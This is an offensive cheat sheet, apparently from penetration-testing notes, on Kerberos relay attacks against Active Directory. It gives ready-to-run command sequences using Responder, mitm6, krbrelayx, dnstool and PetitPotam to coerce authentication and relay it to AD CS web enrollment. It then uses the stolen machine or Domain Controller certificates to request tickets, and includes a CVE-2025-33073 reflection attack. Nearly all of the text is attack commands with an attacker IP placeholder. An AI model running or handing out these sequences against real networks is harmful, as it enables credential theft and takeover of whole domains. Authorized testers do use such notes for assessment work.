# Internal - Kerberos Relay

## Kerberos Relay over HTTP

**Requirements**:

- Kerberos authentication for services without signing
HTTP through multicast poisoning (LLMNR)

```
python3 Responder.py -I eth0 -N <PKI_SERVER_NETBIOS_NAME>
sudo python3 krbrelayx.py --target 'http://<PKI_SERVER>.<DOMAIN.LOCAL>/certsrv/' -ip <ATTACKER_IP> --adcs --template User -debug
```

## Kerberos Relay over DNS

```
sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine
sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
python gettgtpkinit.py -pfx-base64 MIIRFQIBA..cut..lODSghScECP5hGFE3PXoz internal.corp/icorp-w10$ icorp-w10.ccache
```

## Kerberos Relay over SMB

```
dnstool.py -u "DOMAIN.LOCAL\\user" -p "pass" -r "pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp
petitpotam.py -u 'user' -p 'pass' -d DOMAIN.LOCAL 'pki1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' dc.domain.local
krbrelayx.py -t 'http://pki.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'DC$'
gettgtpkinit.py -cert-pfx 'DC$.pfx' 'DOMAIN.LOCAL/DC$' DC.ccache
```

## Kerberos Reflection - CVE-2025-33073

```
dnstool.py -u 'domain.local\\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRC... -d 198.51.100.27
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
petitpotam.py -d domain.local -u username -p 'password' "TARGET1UWhRC..." "TARGET.DOMAIN.LOCAL"
```
